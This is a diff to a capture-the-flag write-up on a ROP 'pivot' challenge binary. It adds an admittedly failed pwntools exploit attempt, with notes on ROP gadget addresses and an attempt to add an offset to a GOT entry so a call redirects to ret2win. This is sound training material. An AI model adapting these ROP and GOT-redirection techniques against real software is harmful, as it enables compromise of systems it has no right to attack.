@@ -371,6 +371,12 @@ interpretation of it:
 - Add the offset `ret2win - foothold_function` to the resolved address
 - Call `foothold_function@plt` again, which will now jump to `ret2win`
 
+"Could be" seems to be the correct wording here, I was unable to find any
+gadgets that would allow for such a thing.
+
+<details>
+<summary>My (unsuccessful) attempt</summary>
+
 ```python3
 #!/usr/bin/env python3
 from pwn import *
@@ -419,11 +425,10 @@ heap_payload  = p64(0x13) + p64(0x14) + p64(0x15)
 # 1. Resolve foothold by calling it
 heap_payload += p64(foothold_plt)
 # 2. Load foothold@got into $rax register
-heap_payload += p64(pop_rax)
-heap_payload += p64(foothold_got)
+#heap_payload += p64(pop_rax)
+#heap_payload += p64(foothold_got)
 # TODO: figure it out
 # some add (byte/dword/qword) pointer, reg
-# 0x0000000000400828 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
 # 0x0000000000400a3c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
 # ^ can't work out, its adding values from the same register
 # foothold/(%rax): 0x7faeaf1f c96a
@@ -431,6 +436,25 @@ heap_payload += p64(foothold_got)
 # we probably would have to take at least the first two bytes into account
 # this one maybe? ---v
 # 0x000000000040078d : add byte ptr [rax], r8b ; ret
+# 0x0000000000400828 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
+# problem: we can't control r8
+
+# 0x0000000000400c8b : call qword ptr [rbx]
+
+# Or: read value out mov (%rax),%rax
+# add
+# write back in ?? is there any such gadget ?? Answer: no, there isn't
+
+# ~~Or: use fgets to overwrite value?~~ there is no fgets!
+
+# pop rbp; ret # libelf.got['foothold_function'] + 0x3d
+# 0x00000000004007c8 : pop rbp ; ret
+heap_payload += p64(pop_rbp)
+heap_payload += p64(foothold_got - 0x3d)
+# add [rbp], reg # reg = 0xa81 - 0x96a
+# 0x0000000000400828 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
+heap_payload += p64(0x00400828)
+# but again: we can't control ebx/rbx either!
 
 assert len(heap_payload) <= 256, "Heap payload must NOT be larger than 256 bytes!"
 p.recvuntil(b'> ')
@@ -449,6 +473,8 @@ p.sendline(stack_payload)
 
 p.interactive()
 ```
+
+</details>
 
 ## Solution 3
 
